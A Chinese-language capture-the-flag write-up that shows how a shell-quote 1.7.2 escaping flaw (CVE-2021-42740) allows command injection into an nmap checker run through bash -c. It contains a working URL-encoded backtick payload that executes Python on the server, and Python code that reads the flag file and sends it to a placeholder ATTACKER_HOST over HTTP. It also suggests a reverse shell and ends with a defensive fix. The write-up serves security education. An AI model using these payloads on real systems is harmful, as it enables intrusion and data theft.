# ~AveMujica's Masquerade~

## 题目简述

服务提供 `GET /checker?url=host:port`，把输入拆成主机和端口后执行一次 Nmap 扫描。源码试图通过 `shell-quote` 转义参数：

```javascript
const parts = url.split(':');
const host = parts[0];
const port = parts.slice(1).join(':');
const command = shellQuote.quote(['nmap', '-p', port, host]);
const nmap = spawn('bash', ['-c', command]);
```

危险点在于，参数数组最终仍被拼成字符串交给 `bash -c`。项目锁定 `shell-quote@1.7.2`，该版本存在反引号转义缺陷，可由 `port` 参数注入命令。

原 README 把问题写成了 CVE-2023-30589，但这个编号实际对应 Node.js `llhttp` 的 HTTP 请求走私，与本题利用链不符。本题利用的是 `shell-quote` 的 **CVE-2021-42740 / GHSA-g4rg-993r-mgx7**：受影响版本为 `1.6.3` 至 `1.7.2`，`1.7.3` 修复。[GitHub 安全公告](https://github.com/advisories/GHSA-g4rg-993r-mgx7)

## 解题过程

`shell-quote@1.7.2` 对无空格参数使用如下正则转义 shell 元字符：

```javascript
String(s).replace(
    /([A-z]:)?([#!"$&'()*,:;<=>?@\[\\\]^`{|}])/g,
    '$1\\$2'
);
```

问题在 `[A-z]`。ASCII 中大写 `Z` 与小写 `a` 之间还包含 `[`、`\\`、`]`、`^`、`_` 和反引号。于是形如 `` `: `` 的片段会被误认为 Windows 盘符前缀，第一枚反引号不会被转义；配合后续反引号即可形成 Bash 命令替换。`$IFS` 用于代替空格，末尾的 `#` 注释掉剩余命令。

仓库给出的最小 PoC 应放在代码块中，避免反引号破坏 Markdown：

```text
/checker?url=1:%60:%60python3$IFS-c$IFS%5C%5Copen(chr(8%2B48),chr(22%2B97)).write(chr(95))%60%60:%23
```

URL 解码后的关键部分为：

```text
1:`:`python3$IFS-c$IFS\\open(chr(8+48),chr(22+97)).write(chr(95))``:#
```

其中 `chr(8+48)` 是字符 `8`，`chr(22+97)` 是文件模式 `w`，`chr(95)` 是下划线。因此 Python 实际执行：

```python
open('8', 'w').write('_')
```

这一步在服务端创建文件 `8`，证明已经获得任意 Python 代码执行，而不是 Nmap 参数注入。由于接口不回显子进程标准输出，最终应使用带外方式取 flag。Dockerfile 会把 `/flag` 重命名为 `/flag-<16 位随机十六进制串>`，Python 可以用通配符定位并通过 HTTP 回传：

```python
import glob
import urllib.parse
import urllib.request

path = glob.glob('/flag-*')[0]
flag = open(path).read()
url = 'http://ATTACKER_HOST/collect?flag=' + urllib.parse.quote(flag)
urllib.request.urlopen(url)
```

将这段代码压缩为 `python3 -c` 单行并按 PoC 的反引号结构进行 URL 编码即可。题目容器允许访问公网，因而也可以建立反向 shell 后直接执行 `cat /flag-*`；HTTP 回传更短，也不依赖交互式终端。

## 方法总结

使用参数数组并不等于安全：本题先把数组交给存在缺陷的转义库，再把结果送入 `bash -c`，重新引入了完整 shell 语义。审计时应沿数据流一直检查到最终执行 API；最稳妥的修复是完全移除 shell，直接使用 `spawn('nmap', ['-p', port, host])`，并把端口解析为限定范围内的整数。还应核对 CVE 编号与真实漏洞机制，避免因为题目说明中的误标而走向 HTTP 请求走私。
